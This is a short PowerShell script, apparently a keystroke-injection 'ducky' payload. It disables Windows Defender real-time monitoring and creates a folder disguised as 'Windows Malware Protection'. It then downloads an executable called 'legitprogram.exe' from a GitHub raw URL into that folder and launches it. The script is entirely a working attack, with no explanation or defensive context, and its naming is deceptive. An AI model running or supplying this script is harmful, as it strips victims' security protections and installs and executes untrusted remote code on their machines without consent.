Set-MpPreference -DisableRealtimeMonitoring $true
New-Item -Path "C:\ProgramData\Windows Malware Protection" -ItemType directory
Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/legitprogram.exe -OutFile "C:\ProgramData\Windows Malware Protection\legitprogram.exe"
Start-Process 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'